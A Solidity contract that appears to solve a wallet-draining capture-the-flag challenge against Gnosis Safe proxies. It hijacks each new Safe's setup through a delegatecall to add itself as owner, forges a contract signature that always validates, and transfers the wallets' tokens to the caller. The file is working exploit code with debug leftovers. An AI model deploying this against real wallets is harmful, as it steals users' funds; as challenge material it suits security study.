// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxy.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
import "@gnosis.pm/safe-contracts/contracts/common/Enum.sol";
import "@gnosis.pm/safe-contracts/contracts/common/SignatureDecoder.sol";

import "hardhat/console.sol";

contract BackdoorChallenge is GnosisSafe {
    function addAttackerAsOwner(address attacker) external {
        owners[attacker] = attacker;
    }

    function attack(
        GnosisSafeProxyFactory factory,
        address _singleton,
        IProxyCreationCallback callback,
        address[] calldata _owners,
        address _token
    ) external {
        for (uint256 i = 0; i < _owners.length; i++) {
            bytes memory data = abi.encodeWithSignature(
                "addAttackerAsOwner(address)",
                address(this)
            );
            address[] memory owner = new address[](1);
            owner[0] = _owners[i];
            bytes memory initializer = abi.encodeWithSignature(
                "setup(address[],uint256,address,bytes,address,address,uint256,address)",
                owner,
                1,
                address(this),
                data,
                address(0),
                _token,
                0,
                address(0)
            );
            GnosisSafeProxy proxy = factory.createProxyWithCallback(
                _singleton,
                initializer,
                0,
                callback
            );
            address payable walletAddress = payable(proxy);

            bool _isOwner = GnosisSafe(walletAddress).isOwner(address(this));

            console.log("is owner: ", _isOwner);

            uint256 bal = IERC20(_token).balanceOf(walletAddress);

            console.log("wallet balance after: ", bal);

            //"000000000000000000000000"
            bytes12 x = 0;
            // bytes32 s = bytes32(1);
            bytes1 y = 0;
            bytes32 z = 0;

            // (uint8 v, bytes32 r, bytes32 s) = signatureSplit(signature, 0);

            // console.log("signature split v,r,s is: ");
            // console.log(v);
            // console.logBytes32(r);
            // console.logBytes32(s);
            // console.log(uint256(s));

            // uint256 tval = GnosisSafe(walletAddress).getThreshold();

            // console.log("threshold is: ", tval);

            bytes memory execData = abi.encodeWithSignature(
                "transfer(address,uint256)",
                address(this),
                10 ether
            );

            // bytes memory txData = GnosisSafe(walletAddress).encodeTransactionData(
            //     _token,
            //     0,
            //     execData,
            //     Enum.Operation.Call,
            //     gasleft(),
            //     0,
            //     0,
            //     address(0),
            //     payable(address(0)),
            //     0
            // );

            bytes memory signature = abi.encodePacked(
                x,
                address(this),
                x,
                address(65),
                y,
                x,
                address(66),
                z,
                z,
                y,
                y
            );

            console.log("signature is: ");
            console.logBytes(signature);
            console.log("signature length: ", signature.length);
            // console.log("txdata length: ", txData.length);

            GnosisSafe(walletAddress).execTransaction(
                _token,
                0,
                execData,
                Enum.Operation.Call,
                50000,
                0,
                0,
                address(0),
                payable(address(0)),
                signature
            );

            IERC20(_token).transfer(msg.sender, 10 ether);
        }
    }

    function isValidSignature(bytes memory _data, bytes memory _signature)
        public
        view
        returns (bytes4)
    {
        return 0x20c13b0b;
    }
}
